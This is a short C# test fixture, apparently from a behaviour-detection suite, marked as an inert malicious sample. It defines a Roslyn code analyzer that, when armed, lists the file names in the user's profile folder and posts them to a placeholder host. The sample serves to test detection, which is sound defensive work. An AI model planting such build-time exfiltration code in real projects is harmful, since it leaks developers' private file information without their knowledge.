// Inert fixture: never executed (gated by Arm.Armed). BF05 malicious: an analyzer that lists the user profile and posts the names.
using System;
using System.IO;
using System.Net.Http;

namespace Behaviour
{
    public sealed class ProfileAnalyzer : Microsoft.CodeAnalysis.Diagnostics.DiagnosticAnalyzer
    {
        public override void Initialize(object context)
        {
            if (!Arm.Armed) return;
            var files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
            using var client = new HttpClient();
            client.PostAsync("https://example.test/silvergun-behaviour-suite/files", new StringContent(string.Join("\n", files))).GetAwaiter().GetResult();
        }
    }
}
